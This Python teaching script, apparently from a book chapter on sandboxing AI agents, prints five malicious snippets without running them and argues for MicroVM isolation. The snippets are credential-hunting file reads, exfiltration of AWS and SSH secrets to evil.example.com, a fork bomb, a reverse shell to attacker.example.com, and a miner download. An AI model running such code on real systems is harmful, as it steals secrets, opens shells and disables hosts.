"""
Chapter 1 Example: Unsafe Agent Code Demonstration

This script defines several malicious code snippets that an AI agent might
generate, and analyzes each one WITHOUT executing them. It demonstrates
common attack vectors that sandboxing must prevent.
"""

ATTACKS = [
    {
        "name": "Filesystem Traversal",
        "code": """
import os
# Read sensitive system files
with open('/etc/passwd', 'r') as f:
    data = f.read()
# Walk entire filesystem looking for credentials
for root, dirs, files in os.walk('/'):
    for f in files:
        if f.endswith(('.env', '.pem', '.key')):
            print(open(os.path.join(root, f)).read())
""",
        "risks": [
            "Reads /etc/passwd to enumerate system users",
            "Traverses entire filesystem searching for secrets",
            "Targets .env files (API keys), .pem/.key files (TLS certs, SSH keys)",
            "No privilege escalation needed if agent runs as permissive user",
        ],
    },
    {
        "name": "Network Exfiltration",
        "code": """
import urllib.request, os, json
# Gather sensitive data
secrets = {
    'env': dict(os.environ),
    'aws_creds': open(os.path.expanduser('~/.aws/credentials')).read(),
    'ssh_key': open(os.path.expanduser('~/.ssh/id_rsa')).read(),
}
# Exfiltrate to attacker-controlled server
urllib.request.urlopen(
    urllib.request.Request(
        'https://evil.example.com/exfil',
        data=json.dumps(secrets).encode(),
        headers={'Content-Type': 'application/json'}
    )
)
""",
        "risks": [
            "Harvests environment variables (often contain API tokens)",
            "Reads AWS credentials and SSH private keys",
            "Sends all collected data to an external server",
            "Uses stdlib only — no pip install required",
        ],
    },
    {
        "name": "Fork Bomb / Resource Exhaustion",
        "code": """
import os
# Classic fork bomb — exponential process creation
while True:
    os.fork()
""",
        "risks": [
            "Exponentially spawns processes until system is unresponsive",
            "Consumes all available PIDs, memory, and CPU",
            "Affects ALL users on a shared system (denial of service)",
            "Kernel may become unable to spawn cleanup processes",
        ],
    },
    {
        "name": "Reverse Shell",
        "code": """
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.example.com', 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(['/bin/sh', '-i'])
""",
        "risks": [
            "Opens persistent connection to attacker's machine",
            "Redirects stdin/stdout/stderr through the socket",
            "Gives attacker an interactive shell on the host",
            "Bypasses most egress-only firewall rules (outbound TCP)",
        ],
    },
    {
        "name": "Crypto Miner Installation",
        "code": """
import subprocess, urllib.request, tempfile, os
miner_url = 'https://evil.example.com/xmrig'
tmp = tempfile.mktemp()
urllib.request.urlretrieve(miner_url, tmp)
os.chmod(tmp, 0o755)
subprocess.Popen([tmp, '--pool', 'stratum+tcp://pool.example.com:3333',
                  '--user', 'attacker_wallet'], stdout=subprocess.DEVNULL)
""",
        "risks": [
            "Downloads and executes arbitrary binary from the internet",
            "Runs cryptocurrency miner consuming all CPU",
            "Bills accrue to the sandbox operator, profits go to attacker",
            "Process detaches — persists even if agent session ends",
        ],
    },
]


def analyze_attack(attack: dict) -> None:
    """Print analysis of a malicious code snippet."""
    print(f"\n{'=' * 60}")
    print(f"ATTACK: {attack['name']}")
    print(f"{'=' * 60}")
    print("\n[Code snippet — NOT executed]\n")
    for line in attack["code"].strip().split("\n"):
        print(f"    {line}")
    print("\n[Risk Analysis]")
    for i, risk in enumerate(attack["risks"], 1):
        print(f"  {i}. {risk}")


def main():
    print("Chapter 1: Unsafe Agent Code — Attack Vector Demonstration")
    print("=" * 60)
    print("This script ANALYZES but does NOT EXECUTE malicious code.")
    print("Each snippet represents what an unsandboxed AI agent could do.\n")

    for attack in ATTACKS:
        analyze_attack(attack)

    print(f"\n{'=' * 60}")
    print("CONCLUSION")
    print("=" * 60)
    print("""
Without proper sandboxing, an AI agent that generates and runs code has
full access to the host system. A dedicated MicroVM (like AWS Lambda
MicroVMs using Firecracker) isolates each session with:

  - Separate kernel: no shared kernel attack surface
  - Hardware virtualization: KVM-based isolation, <125ms startup
  - Resource limits: max 16 vCPUs, 32 GB RAM, 32 GB disk
  - Network isolation: configurable egress rules per session
  - Ephemeral by default: 8-hour max lifetime, then destroyed

This is why containers alone are insufficient — they share the host
kernel and a single exploit can escape to affect all tenants.
""")


if __name__ == "__main__":
    main()
